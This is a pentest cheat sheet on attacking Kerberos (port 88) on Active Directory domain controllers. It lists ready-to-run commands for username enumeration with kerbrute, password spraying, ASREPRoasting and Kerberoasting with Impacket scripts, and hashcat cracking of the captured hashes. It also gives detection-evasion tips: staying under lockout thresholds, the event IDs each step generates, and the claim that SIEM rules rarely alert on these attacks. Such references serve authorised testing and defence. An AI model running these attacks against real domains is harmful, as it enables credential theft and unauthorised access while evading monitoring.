# Kerberos (88)

!!! tip "Start here"
    Port 88 open means you're looking at a domain controller. Start with username enumeration (no creds needed): `kerbrute userenum -d example.com --dc 10.10.10.10 userlist.txt`. Then immediately try ASREPRoasting — accounts without pre-auth required hand you crackable hashes.

---

## Enumeration

```bash
nmap -p 88 --script krb5-enum-users 10.10.10.10
```

---

## Username Enumeration

```bash
kerbrute userenum -d example.com --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

---

## Password Spraying

Validate a single password against every user in one shot. Significantly stealthier than SMB spraying — Kerberos pre-auth failures log Event ID 4771 (not 4625 like SMB), and most SIEM rules are tuned to SMB lockouts first.

```bash
kerbrute passwordspray -d example.com --dc 10.10.10.10 users.txt 'Winter2024!'
```

To spray a small credential set without triggering lockouts, respect the domain lockout threshold (`nxc smb 10.10.10.10 -u '' -p '' --pass-pol` or query from LDAP) and keep attempts well under it.

!!! warning "Watch out"
    Even with low attempt counts, spraying generates enough 4771s to stand out if the blue team is watching pre-auth failures. On monitored environments, limit to one spray per password and pull user lists from existing LDAP/BloodHound data rather than kerbrute userenum, which itself generates 4768s per attempt.

---

## ASREPRoasting (No Credentials)

Accounts with pre-authentication disabled return a crackable AS-REP hash without any password.

```bash
GetNPUsers.py example.com/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat -outputfile asrep-hashes.txt
```

```bash
hashcat -m 18200 asrep-hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Kerberoasting (Requires Valid Credentials)

Request TGS tickets for accounts with SPNs — the encrypted tickets are crackable offline.

```bash
GetUserSPNs.py example.com/<user>:<pass> -dc-ip 10.10.10.10 -request -outputfile tgs-tickets.txt
```

```bash
hashcat -m 13100 tgs-tickets.txt /usr/share/wordlists/rockyou.txt
```

!!! tip "Real-world"
    ASREPRoasting is low-noise and requires zero credentials — run it as soon as you have a username list. Kerberoasting requires a foothold but is very effective against service accounts that haven't had their passwords rotated. Both attacks are noisy in event logs (4768/4769) but rarely alert on modern deployments unless specifically tuned.
